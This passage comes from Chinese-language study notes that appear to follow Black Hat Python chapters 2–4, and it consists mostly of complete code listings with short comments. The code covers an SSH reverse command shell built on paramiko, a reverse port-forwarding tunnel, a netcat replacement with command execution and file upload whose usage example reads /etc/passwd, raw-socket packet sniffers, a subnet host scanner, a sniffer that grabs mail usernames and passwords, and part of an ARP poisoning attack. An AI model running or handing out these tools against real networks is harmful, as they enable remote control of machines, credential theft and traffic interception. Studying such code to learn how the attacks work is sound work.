= socket.socket(socket.AF_INET, socket.SOCK_STREAM) \u0026gt;\u0026gt;\u0026gt; c.connect((\u0026#39;127.0.0.1\u0026#39;,9988)) \u0026gt;\u0026gt;\u0026gt; c.send(b\u0026#39;wow\u0026#39;) 3 \u0026gt;\u0026gt;\u0026gt; c.shutdown(socket.SHUT_WR) \u0026gt;\u0026gt;\u0026gt; s = c.recv(4096) \u0026gt;\u0026gt;\u0026gt; s b\u0026#39;ACK!\u0026#39; paramiko: 用python操作SSH 先啟動WSL2的sshd\n改/etc/ssh/sshd_config Port = 22 ListenAddress 0.0.0.0 PasswordAuthentication yes 重新啟動sshd dpkg-reconfigure openssh-server sudo service ssh restart ssh_command.py\nimport paramiko def ssh_command(ip, user, passwd, command): client = paramiko.SSHClient() # client can also support using key files # client.load_host_keys(\u0026#39;/home/user/.ssh/known_hosts\u0026#39;) client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect(ip, username=user, password=passwd) ssh_session = client.get_transport().open_session() if ssh_session.active: ssh_session.exec_command(command) print(ssh_session.recv(1024)) return ssh_command(\u0026#39;127.0.0.1\u0026#39;, \u0026#39;justin\u0026#39;, \u0026#39;lovesthepython\u0026#39;, \u0026#39;ls -al\u0026#39;) 連線的流程：\nSSHClient(new client) -\u0026gt; connect [ip,(account, pw)] -\u0026gt; get_transport -\u0026gt; open_session 類比 socket (SOCK_STREAM) -\u0026gt; connect((ip, port)) -\u0026gt; [Nope] -\u0026gt; accept bh_sshRcmd.py\nimport subprocess import paramiko def ssh_command(ip, user, passwd, command): client = paramiko.SSHClient() # client can also support using key files # client.load_host_keys(\u0026#39;/home/user/.ssh/known_hosts\u0026#39;) client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect(ip, username=user, password=passwd) ssh_session = client.get_transport().open_session() if ssh_session.active: ssh_session.send(command)# 這個其實可以不用 print(ssh_session.recv(1024)) # read banner ## === new === while True: # get the command from the SSH server command = ssh_session.recv(1024) try: cmd_output = subprocess.check_output(command, shell=True) ssh_session.send(cmd_output) except Exception as e: ssh_session.send(str(e)) ## === new end === client.close() return ssh_command(\u0026#39;192.168.100.130\u0026#39;, \u0026#39;justin\u0026#39;, \u0026#39;lovesthepython\u0026#39;, \u0026#39;ClientConnected\u0026#39;) 現在是在bh_sshRcmd.py執行指令再塞回去，這邊就是reverse tunnel的fu 不過這要能運作要配合下面的code\nbh_sshserver.py\nimport socket import paramiko import threading import sys # using the server host key from the paramiko demo files host_key = paramiko.RSAKey(filename=\u0026#39;test_rsa.key\u0026#39;) class Server(paramiko.ServerInterface): def __init__(self): self.event = threading.Event() def check_channel_request(self, kind, chanid): if kind == \u0026#39;session\u0026#39;: return paramiko.OPEN_SUCCEEDED return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED def check_auth_password(self, username, password): if username == \u0026#39;root\u0026#39; and password == \u0026#39;toor\u0026#39;: return paramiko.AUTH_SUCCESSFUL return paramiko.AUTH_FAILED server = sys.argv[1] ssh_port = int(sys.argv[2]) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((server, ssh_port)) sock.listen(100) print(\u0026#34;[+] Listening for connection...\u0026#34;) client, addr = sock.accept() except Exception as e: print(\u0026#34;[-] Listen failed: \u0026#34; + str(e)) sys.exit(1) print(\u0026#34;[+] Got a connection!\u0026#34;) try: # noinspection PyTypeChecker bhSession = paramiko.Transport(client) bhSession.add_server_key(host_key) server = Server() try: bhSession.start_server(server=server) except paramiko.SSHException: print(\u0026#34;[-] SSH negotiation failed.\u0026#34;) chan = bhSession.accept(20) print(\u0026#34;[+] Authenticated!\u0026#34;) print(chan.recv(1024)) # 這段其實不用 chan.send(\u0026#34;Welcome to bh_ssh!\u0026#34;) while True: try: command = input(\u0026#34;Enter command: \u0026#34;).strip(\u0026#34;\\n\u0026#34;) if command != \u0026#34;exit\u0026#34;: chan.send(command) print(chan.recv(1024).decode(errors=\u0026#34;ignore\u0026#34;) + \u0026#34;\\n\u0026#34;) else: chan.send(\u0026#34;exit\u0026#34;) print(\u0026#34;Exiting...\u0026#34;) bhSession.close() raise Exception(\u0026#34;exit\u0026#34;) except KeyboardInterrupt: bhSession.close() except Exception as e: print(\u0026#34;[-] Caught exception: \u0026#34; + str(e)) bhSession.close() finally: sys.exit(1) 大概的流程是\nclient連到server server丟指令到client client跑指令回傳結果 這邊就是自幹reverse tunnel\n下面就是包好的版本 要注意到因為目的是relay sshd的東西到server 所以剛剛例子是跑指令的部分變成proxy的code\nrforward.py\n#!/usr/bin/env python # Copyright (C) 2008 Robey Pointer \u0026lt;robeypointer@gmail.com\u0026gt; # # This file is part of paramiko. # # Paramiko is free software; you can redistribute it and/or modify it under the # terms of the GNU Lesser General Public License as published by the Free # Software Foundation; either version 2.1 of the License, or (at your option) # any later version. # # Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY # WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR # A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more # details. # # You should have received a copy of the GNU Lesser General Public License # along with Paramiko; if not, write to the Free Software Foundation, Inc., # 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA. \u0026#34;\u0026#34;\u0026#34; Sample script showing how to do remote port forwarding over paramiko. This script connects to the requested SSH server and sets up remote port forwarding (the openssh -R option) from a remote port through a tunneled connection to a destination reachable from the local machine. \u0026#34;\u0026#34;\u0026#34; import getpass import socket import select import sys import threading from optparse import OptionParser import paramiko SSH_PORT = 22 DEFAULT_PORT = 4000 g_verbose = True def handler(chan, host, port): sock = socket.socket() try: sock.connect((host, port)) # 與剛剛的例子對比，原本是在這裡跑指令，不過這邊是連到另一台server except Exception as e: verbose(\u0026#34;Forwarding request to %s:%d failed: %r\u0026#34; % (host, port, e)) return verbose( \u0026#34;Connected! Tunnel open %r -\u0026gt; %r -\u0026gt; %r\u0026#34; % (chan.origin_addr, chan.getpeername(), (host, port)) ) while True: # chan(sshd) \u0026lt;-\u0026gt; sock(real server) r, w, x = select.select([sock, chan], [], []) if sock in r: data = sock.recv(1024) if len(data) == 0: break chan.send(data) if chan in r: data = chan.recv(1024) if len(data) == 0: break sock.send(data) chan.close() sock.close() verbose(\u0026#34;Tunnel closed from %r\u0026#34; % (chan.origin_addr,)) def reverse_forward_tunnel(server_port, remote_host, remote_port, transport): transport.request_port_forward(\u0026#34;\u0026#34;, server_port) # bind(\u0026#34;0.0.0.0\u0026#34;, server_port) while True: chan = transport.accept(1000) # accept 來自sshd的連線 if chan is None: continue thr = threading.Thread( target=handler, args=(chan, remote_host, remote_port) ) thr.setDaemon(True) thr.start() def verbose(s): if g_verbose: print(s) HELP = \u0026#34;\u0026#34;\u0026#34;\\ Set up a reverse forwarding tunnel across an SSH server, using paramiko. A port on the SSH server (given with -p) is forwarded across an SSH session back to the local machine, and out to a remote site reachable from this network. This is similar to the openssh -R option. \u0026#34;\u0026#34;\u0026#34; def get_host_port(spec, default_port): \u0026#34;\u0026#34;\u0026#34;parse \u0026#39;hostname:22\u0026#39; into a host and port, with the port optional\u0026#34;\u0026#34;\u0026#34; args = (spec.split(\u0026#34;:\u0026#34;, 1) + [default_port])[:2] args[1] = int(args[1]) return args[0], args[1] def parse_options(): global g_verbose parser = OptionParser( usage=\u0026#34;usage: %prog [options] \u0026lt;ssh-server\u0026gt;[:\u0026lt;server-port\u0026gt;]\u0026#34;, version=\u0026#34;%prog 1.0\u0026#34;, description=HELP, ) parser.add_option( \u0026#34;-q\u0026#34;, \u0026#34;--quiet\u0026#34;, action=\u0026#34;store_false\u0026#34;, dest=\u0026#34;verbose\u0026#34;, default=True, help=\u0026#34;squelch all informational output\u0026#34;, ) parser.add_option( \u0026#34;-p\u0026#34;, \u0026#34;--remote-port\u0026#34;, action=\u0026#34;store\u0026#34;, type=\u0026#34;int\u0026#34;, dest=\u0026#34;port\u0026#34;, default=DEFAULT_PORT, help=\u0026#34;port on server to forward (default: %d)\u0026#34; % DEFAULT_PORT, ) parser.add_option( \u0026#34;-u\u0026#34;, \u0026#34;--user\u0026#34;, action=\u0026#34;store\u0026#34;, type=\u0026#34;string\u0026#34;, dest=\u0026#34;user\u0026#34;, default=getpass.getuser(), help=\u0026#34;username for SSH authentication (default: %s)\u0026#34; % getpass.getuser(), ) parser.add_option( \u0026#34;-K\u0026#34;, \u0026#34;--key\u0026#34;, action=\u0026#34;store\u0026#34;, type=\u0026#34;string\u0026#34;, dest=\u0026#34;keyfile\u0026#34;, default=None, help=\u0026#34;private key file to use for SSH authentication\u0026#34;, ) parser.add_option( \u0026#34;\u0026#34;, \u0026#34;--no-key\u0026#34;, action=\u0026#34;store_false\u0026#34;, dest=\u0026#34;look_for_keys\u0026#34;, default=True, help=\u0026#34;don\u0026#39;t look for or use a private key file\u0026#34;, ) parser.add_option( \u0026#34;-P\u0026#34;, \u0026#34;--password\u0026#34;, action=\u0026#34;store_true\u0026#34;, dest=\u0026#34;readpass\u0026#34;, default=False, help=\u0026#34;read password (for key or password auth) from stdin\u0026#34;, ) parser.add_option( \u0026#34;-r\u0026#34;, \u0026#34;--remote\u0026#34;, action=\u0026#34;store\u0026#34;, type=\u0026#34;string\u0026#34;, dest=\u0026#34;remote\u0026#34;, default=None, metavar=\u0026#34;host:port\u0026#34;, help=\u0026#34;remote host and port to forward to\u0026#34;, ) options, args = parser.parse_args() if len(args) != 1: parser.error(\u0026#34;Incorrect number of arguments.\u0026#34;) if options.remote is None: parser.error(\u0026#34;Remote address required (-r).\u0026#34;) g_verbose = options.verbose server_host, server_port = get_host_port(args[0], SSH_PORT) remote_host, remote_port = get_host_port(options.remote, SSH_PORT) return options, (server_host, server_port), (remote_host, remote_port) def main(): options, server, remote = parse_options() password = None if options.readpass: password = getpass.getpass(\u0026#34;Enter SSH password: \u0026#34;) client = paramiko.SSHClient() client.load_system_host_keys() client.set_missing_host_key_policy(paramiko.WarningPolicy()) verbose(\u0026#34;Connecting to ssh host %s:%d ...\u0026#34; % (server[0], server[1])) try: client.connect( server[0], server[1], username=options.user, key_filename=options.keyfile, look_for_keys=options.look_for_keys, password=password, ) except Exception as e: print(\u0026#34;*** Failed to connect to %s:%d: %r\u0026#34; % (server[0], server[1], e)) sys.exit(1) verbose( \u0026#34;Now forwarding remote port %d to %s:%d ...\u0026#34; % (options.port, remote[0], remote[1]) ) try: reverse_forward_tunnel( options.port, remote[0], remote[1], client.get_transport() ) except KeyboardInterrupt: print(\u0026#34;C-c: Port forwarding stopped.\u0026#34;) sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() 總複習: Netcat Replacement bhnet.py\nimport sys import socket import getopt import threading import subprocess # define some global variables listen = False command = False upload = False execute = \u0026#34;\u0026#34; target = \u0026#34;\u0026#34; upload_destination = \u0026#34;\u0026#34; port = 0 # this runs a command and returns the output def run_command(cmd): # trim the newline cmd = cmd.rstrip() # run the command and get the output back try: output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) except subprocess.CalledProcessError as e: output = e.output # send the output back to the client return output # this handles incoming client connections def client_handler(client_socket): global upload global execute global command # check for upload if len(upload_destination): # read in all of the bytes and write to our destination file_buffer = \u0026#34;\u0026#34; # keep reading data until none is available while True: data = client_socket.recv(1024) if not data: break else: file_buffer += data # now we take these bytes and try to write them out try: file_descriptor = open(upload_destination, \u0026#34;wb\u0026#34;) file_descriptor.write(file_buffer.encode(\u0026#39;utf-8\u0026#39;)) file_descriptor.close() # acknowledge that we wrote the file out client_socket.send( \u0026#34;Successfully saved file to %s\\r\\n\u0026#34; % upload_destination) except OSError: client_socket.send( \u0026#34;Failed to save file to %s\\r\\n\u0026#34; % upload_destination) # check for command execution if len(execute): # run the command output = run_command(execute) client_socket.send(output) # now we go into another loop if a command shell was requested if command: while True: # show a simple prompt client_socket.send(\u0026#34;\u0026lt;BHP:#\u0026gt; \u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) # now we receive until we see a linefeed (enter key) cmd_buffer = b\u0026#39;\u0026#39; while b\u0026#34;\\n\u0026#34; not in cmd_buffer: cmd_buffer += client_socket.recv(1024) # we have a valid command so execute it and send back the results response = run_command(cmd_buffer) # send back the response client_socket.send(response) # this is for incoming connections def server_loop(): global target global port # if no target is defined we listen on all interfaces if not len(target): target = \u0026#34;0.0.0.0\u0026#34; server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((target, port)) server.listen(5) while True: client_socket, addr = server.accept() # spin off a thread to handle our new client client_thread = threading.Thread(target=client_handler, args=(client_socket,)) client_thread.start() # if we don\u0026#39;t listen we are a client... make it so. def client_sender(buffer): client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: # connect to our target host client.connect((target, port)) # if we detect input from stdin send it # if not we are going to wait for the user to punch some in if len(buffer): client.send(buffer.encode(\u0026#39;utf-8\u0026#39;)) while True: # now wait for data back recv_len = 1 response = b\u0026#39;\u0026#39; while recv_len: data = client.recv(4096) recv_len = len(data) response += data if recv_len \u0026lt; 4096: break print(response.decode(\u0026#39;utf-8\u0026#39;), end=\u0026#39; \u0026#39;) # wait for more input buffer = input(\u0026#34;\u0026#34;) buffer += \u0026#34;\\n\u0026#34; # send it off client.send(buffer.encode(\u0026#39;utf-8\u0026#39;)) except socket.error as exc: # just catch generic errors - you can do your homework to beef this up print(\u0026#34;[*] Exception! Exiting.\u0026#34;) print(f\u0026#34;[*] Caught exception socket.error: {exc}\u0026#34;) # teardown the connection client.close() def usage(): print(\u0026#34;Netcat Replacement\u0026#34;) print() print(\u0026#34;Usage: bhpnet.py -t target_host -p port\u0026#34;) print( \u0026#34;-l --listen - listen on [host]:[port] for incoming \u0026#34; \u0026#34;connections\u0026#34;) print( \u0026#34;-e --execute=file_to_run - execute the given file upon receiving \u0026#34; \u0026#34;a connection\u0026#34;) print(\u0026#34;-c --command - initialize a command shell\u0026#34;) print( \u0026#34;-u --upload=destination - upon receiving connection upload a file \u0026#34; \u0026#34;and write to [destination]\u0026#34;) print() print() print(\u0026#34;Examples: \u0026#34;) print(\u0026#34;bhpnet.py -t 192.168.0.1 -p 5555 -l -c\u0026#34;) print(\u0026#34;bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\u0026#34;) print(\u0026#34;bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\u0026#34;cat /etc/passwd\\\u0026#34;\u0026#34;) print(\u0026#34;echo \u0026#39;ABCDEFGHI\u0026#39; | ./bhpnet.py -t 192.168.11.12 -p 135\u0026#34;) sys.exit(0) def main(): global listen global port global execute global command global upload_destination global target if not len(sys.argv[1:]): usage() # read the commandline options try: opts, args = getopt.getopt(sys.argv[1:], \u0026#34;hle:t:p:cu:\u0026#34;, [\u0026#34;help\u0026#34;, \u0026#34;listen\u0026#34;, \u0026#34;execute\u0026#34;, \u0026#34;target\u0026#34;, \u0026#34;port\u0026#34;, \u0026#34;command\u0026#34;, \u0026#34;upload\u0026#34;]) for o, a in opts: if o in (\u0026#34;-h\u0026#34;, \u0026#34;--help\u0026#34;): usage() elif o in (\u0026#34;-l\u0026#34;, \u0026#34;--listen\u0026#34;): listen = True elif o in (\u0026#34;-e\u0026#34;, \u0026#34;--execute\u0026#34;): execute = a elif o in (\u0026#34;-c\u0026#34;, \u0026#34;--commandshell\u0026#34;): command = True elif o in (\u0026#34;-u\u0026#34;, \u0026#34;--upload\u0026#34;): upload_destination = a elif o in (\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;): target = a elif o in (\u0026#34;-p\u0026#34;, \u0026#34;--port\u0026#34;): port = int(a) else: assert False, \u0026#34;Unhandled Option\u0026#34; except getopt.GetoptError as err: print(str(err)) usage() # are we going to listen or just send data from STDIN? if not listen and len(target) and port \u0026gt; 0: # read in the buffer from the commandline # this will block, so send CTRL-D if not sending input # to stdin buffer = sys.stdin.read() # send data off client_sender(buffer) # we are going to listen and potentially # upload things, execute commands and drop a shell back # depending on our command line options above if listen: server_loop() main() 就是proxy + run_command + server + client的集大成(不包含SSH) 作為netcat(nc)的替代品\nCH3 這章就是介紹raw socket，沒有第四層的socket\nsniffer_basic.py\nimport socket import os # host to listen on host = \u0026#34;192.168.0.196\u0026#34; # create a raw socket and bind it to the public interface if os.name == \u0026#34;nt\u0026#34;: socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # 沒有第四層，就不用port # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we\u0026#39;re on Windows we need to send an IOCTL # to setup promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) # read in a single packet print(sniffer.recvfrom(65535)) # if we\u0026#39;re on Windows turn off promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 設定一個socket接收所有packet，但收到的資料都是byte，要依據protocol的規定轉成對應的datatype\nsniffer_ip_header_decode.py\nimport socket import os import struct from ctypes import * # host to listen on host = \u0026#34;192.168.0.187\u0026#34; class IP(Structure): _fields_ = [ (\u0026#34;ihl\u0026#34;, c_ubyte, 4), (\u0026#34;version\u0026#34;, c_ubyte, 4), (\u0026#34;tos\u0026#34;, c_ubyte), (\u0026#34;len\u0026#34;, c_ushort), (\u0026#34;id\u0026#34;, c_ushort), (\u0026#34;offset\u0026#34;, c_ushort), (\u0026#34;ttl\u0026#34;, c_ubyte), (\u0026#34;protocol_num\u0026#34;, c_ubyte), (\u0026#34;sum\u0026#34;, c_ushort), (\u0026#34;src\u0026#34;, c_uint32), (\u0026#34;dst\u0026#34;, c_uint32) ] def __new__(cls, socket_buffer=None): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer=None): self.socket_buffer = socket_buffer # map protocol constants to their names self.protocol_map = {1: \u0026#34;ICMP\u0026#34;, 6: \u0026#34;TCP\u0026#34;, 17: \u0026#34;UDP\u0026#34;} # human readable IP addresses self.src_address = socket.inet_ntoa(struct.pack(\u0026#34;@I\u0026#34;, self.src)) self.dst_address = socket.inet_ntoa(struct.pack(\u0026#34;@I\u0026#34;, self.dst)) # human readable protocol try: self.protocol = self.protocol_map[self.protocol_num] except IndexError: self.protocol = str(self.protocol_num) # create a raw socket and bind it to the public interface if os.name == \u0026#34;nt\u0026#34;: socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we\u0026#39;re on Windows we need to send some ioctl # to setup promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) try: while True: # read in a single packet raw_buffer = sniffer.recvfrom(65535)[0] # create an IP header from the first 20 bytes of the buffer ip_header = IP(raw_buffer[:20]) print(\u0026#34;Protocol: %s %s -\u0026gt; %s\u0026#34; % ( ip_header.protocol, ip_header.src_address, ip_header.dst_address) ) except KeyboardInterrupt: # if we\u0026#39;re on Windows turn off promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 這很像把水用成造型冰塊一樣，把byte依據field的規定來找出我們需要的資訊 sniffer_with_icmp.py\nimport socket import os import struct from ctypes import * # host to listen on host = \u0026#34;192.168.0.187\u0026#34; class IP(Structure): _fields_ = [ (\u0026#34;ihl\u0026#34;, c_ubyte, 4), # c_ubyte的前4個bits (\u0026#34;version\u0026#34;, c_ubyte, 4), # c_ubyte的後4個bits (\u0026#34;tos\u0026#34;, c_ubyte), (\u0026#34;len\u0026#34;, c_ushort), (\u0026#34;id\u0026#34;, c_ushort), (\u0026#34;offset\u0026#34;, c_ushort), (\u0026#34;ttl\u0026#34;, c_ubyte), (\u0026#34;protocol_num\u0026#34;, c_ubyte), (\u0026#34;sum\u0026#34;, c_ushort), (\u0026#34;src\u0026#34;, c_uint32), (\u0026#34;dst\u0026#34;, c_uint32) ] def __new__(cls, socket_buffer=None): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer=None): self.socket_buffer = socket_buffer # map protocol constants to their names self.protocol_map = {1: \u0026#34;ICMP\u0026#34;, 6: \u0026#34;TCP\u0026#34;, 17: \u0026#34;UDP\u0026#34;} # human readable IP addresses self.src_address = socket.inet_ntoa(struct.pack(\u0026#34;@I\u0026#34;, self.src)) self.dst_address = socket.inet_ntoa(struct.pack(\u0026#34;@I\u0026#34;, self.dst)) # human readable protocol try: self.protocol = self.protocol_map[self.protocol_num] except IndexError: self.protocol = str(self.protocol_num) class ICMP(Structure): _fields_ = [ (\u0026#34;type\u0026#34;, c_ubyte), (\u0026#34;code\u0026#34;, c_ubyte), (\u0026#34;checksum\u0026#34;, c_ushort), (\u0026#34;unused\u0026#34;, c_ushort), (\u0026#34;next_hop_mtu\u0026#34;, c_ushort) ] def __new__(cls, socket_buffer): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer): self.socket_buffer = socket_buffer # create a raw socket and bind it to the public interface if os.name == \u0026#34;nt\u0026#34;: socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we\u0026#39;re on Windows we need to send some ioctl # to setup promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) try: while True: # read in a single packet raw_buffer = sniffer.recvfrom(65535)[0] # create an IP header from the first 20 bytes of the buffer ip_header = IP(raw_buffer[:20]) print(\u0026#34;Protocol: %s %s -\u0026gt; %s\u0026#34; % ( ip_header.protocol, ip_header.src_address, ip_header.dst_address) ) # if it\u0026#39;s ICMP we want it if ip_header.protocol == \u0026#34;ICMP\u0026#34;: # calculate where our ICMP packet starts offset = ip_header.ihl * 4 buf = raw_buffer[offset:offset + sizeof(ICMP)] # create our ICMP structure icmp_header = ICMP(buf) print(\u0026#34;ICMP -\u0026gt; Type: %d Code: %d\u0026#34; % ( icmp_header.type, icmp_header.code) ) # handle CTRL-C except KeyboardInterrupt: # if we\u0026#39;re on Windows turn off promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) ICMP是(IP (ICMP ...))的包裝 但都byte要怎麼區分哪裡是IP還是ICMP的byte?\n因此IP要知道自己有多長(ip_header.ihl * 4，乘4是因為ihl的單位是4bytes)，這樣就可以知道ICMP從哪邊開始\nscanner.py\nimport socket import os import struct import threading from ipaddress import ip_address, ip_network from ctypes import * # host to listen on host = \u0026#34;192.168.0.187\u0026#34; # subnet to target tgt_subnet = \u0026#34;192.168.0.0/24\u0026#34; # magic we\u0026#39;ll check ICMP responses for tgt_message = \u0026#34;PYTHONRULES!\u0026#34; def udp_sender(sub_net, magic_message): sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for ip in ip_network(sub_net).hosts(): sender.sendto(magic_message.encode(\u0026#39;utf-8\u0026#39;), (str(ip), 65212)) class IP(Structure): _fields_ = [ (\u0026#34;ihl\u0026#34;, c_ubyte, 4), (\u0026#34;version\u0026#34;, c_ubyte, 4), (\u0026#34;tos\u0026#34;, c_ubyte), (\u0026#34;len\u0026#34;, c_ushort), (\u0026#34;id\u0026#34;, c_ushort), (\u0026#34;offset\u0026#34;, c_ushort), (\u0026#34;ttl\u0026#34;, c_ubyte), (\u0026#34;protocol_num\u0026#34;, c_ubyte), (\u0026#34;sum\u0026#34;, c_ushort), (\u0026#34;src\u0026#34;, c_uint32), (\u0026#34;dst\u0026#34;, c_uint32) ] def __new__(cls, socket_buffer=None): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer=None): self.socket_buffer = socket_buffer # map protocol constants to their names self.protocol_map = {1: \u0026#34;ICMP\u0026#34;, 6: \u0026#34;TCP\u0026#34;, 17: \u0026#34;UDP\u0026#34;} # human readable IP addresses self.src_address = socket.inet_ntoa(struct.pack(\u0026#34;@I\u0026#34;, self.src)) self.dst_address = socket.inet_ntoa(struct.pack(\u0026#34;@I\u0026#34;, self.dst)) # human readable protocol try: self.protocol = self.protocol_map[self.protocol_num] except IndexError: self.protocol = str(self.protocol_num) class ICMP(Structure): _fields_ = [ (\u0026#34;type\u0026#34;, c_ubyte), (\u0026#34;code\u0026#34;, c_ubyte), (\u0026#34;checksum\u0026#34;, c_ushort), (\u0026#34;unused\u0026#34;, c_ushort), (\u0026#34;next_hop_mtu\u0026#34;, c_ushort) ] def __new__(cls, socket_buffer): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer): self.socket_buffer = socket_buffer # create a raw socket and bind it to the public interface if os.name == \u0026#34;nt\u0026#34;: socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we\u0026#39;re on Windows we need to send some ioctl # to setup promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) # start sending packets t = threading.Thread(target=udp_sender, args=(tgt_subnet, tgt_message)) t.start() try: while True: # read in a single packet raw_buffer = sniffer.recvfrom(65535)[0] # create an IP header from the first 20 bytes of the buffer ip_header = IP(raw_buffer[:20]) print(\u0026#34;Protocol: %s %s -\u0026gt; %s\u0026#34; % ( ip_header.protocol, ip_header.src_address, ip_header.dst_address) ) # if it\u0026#39;s ICMP we want it if ip_header.protocol == \u0026#34;ICMP\u0026#34;: # calculate where our ICMP packet starts offset = ip_header.ihl * 4 buf = raw_buffer[offset:offset + sizeof(ICMP)] # create our ICMP structure icmp_header = ICMP(buf) print(\u0026#34;ICMP -\u0026gt; Type: %d Code: %d\u0026#34; % ( icmp_header.type, icmp_header.code) ) # now check for the TYPE 3 and CODE 3 which indicates # a host is up but no port available to talk to if icmp_header.code == 3 and icmp_header.type == 3: # check to make sure we are receiving the response # that lands in our subnet if ip_address(ip_header.src_address) in ip_network(tgt_subnet): # test for our magic message if raw_buffer[len(raw_buffer) - len(tgt_message):] == tgt_message: print(\u0026#34;Host Up: %s\u0026#34; % ip_header.src_address) # handle CTRL-C except KeyboardInterrupt: # if we\u0026#39;re on Windows turn off promiscuous mode if os.name == \u0026#34;nt\u0026#34;: sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 目的是找出子網路中的活動ip\n流程是一個thraed對某個子網路的所有ip送udp，如果host還活著，就會退回封包並加上icmp格式的錯誤訊息\nCH4 mail_sniffer.py\nfrom kamene.all import * # our packet callback def packet_callback(packet): if packet[TCP].payload: mail_packet = bytes(packet[TCP].payload) if b\u0026#39;user\u0026#39; in mail_packet.lower() or b\u0026#39;pass\u0026#39; in mail_packet.lower(): print(\u0026#34;[*] Server: %s\u0026#34; % packet[IP].dst) print(\u0026#34;[*] %s\u0026#34; % packet[TCP].payload) # fire up our sniffer sniff(filter=\u0026#34;tcp port 110 or tcp port 25 or tcp port 143\u0026#34;, prn=packet_callback, store=0) 這應該很直觀，目的是看tcp payload有沒有user與pass\n之後應該補個tcpdump的條件式語法。\narper.py\nfrom kamene.all import * import sys import threading interface = \u0026#34;en1\u0026#34; tgt_ip = \u0026#34;172.16.1.71\u0026#34; tgt_gateway = \u0026#34;172.16.1.254\u0026#34; packet_count = 1000 poisoning = True def restore_target(gateway_ip, gateway_mac, target_ip, target_mac): # slightly different method using send print(\u0026#34;[*] Restoring target...\u0026#34;) send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;, hwsrc=gateway_mac), count=5) send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;, hwsrc=target_mac), count=5) def get_mac(ip_address): responses, unanswered = srp( Ether(dst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;) / ARP(pdst=ip_address), timeout=2, retry=10 ) # return the MAC address from a response for s, r in responses: return r[Ether].src return None def poison_target(gateway_ip, gateway_mac, target_ip, target_mac): global poisoning poison_tgt = ARP() poison_tgt.op = 2 poison_tgt.psrc = gateway_ip poison_tgt.pdst = target_ip poison_tgt.hwdst = target_mac poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = target_ip poison_gateway.pdst = gateway_ip poison_gateway.hwdst = gateway_mac print(\u0026#34;[*] Beginning the ARP poison. [CTRL-C to stop]\u0026#34;) while poisoning: send(poison_tgt) send(poison_gateway) time.sleep(2) print(\u0026#34;[*] ARP poison attack finished.\u0026#34;) return # set our interface conf.iface = interface # turn off output conf.verb = 0 print(\u0026#34;[*] Setting up %s\u0026#34; % interface) tgt_gateway_mac = get_mac(tgt_gateway) if tgt_gateway_mac is None: print(\u0026#34;[!!!] Failed to get gateway MAC. Exiting.\u0026#34;) sys.exit(0) else: print(\u0026#34;[*] Gateway %s is at %s\u0026#34; % (tgt_gateway, tgt_gateway_mac)) tgt_mac = get_mac(tgt_ip) if tgt_mac is None: print(\u0026#34;[!!!] Failed to get target MAC. Exiting.\u0026#34;) sys.exit(0) else: print(\u0026#34;[*] 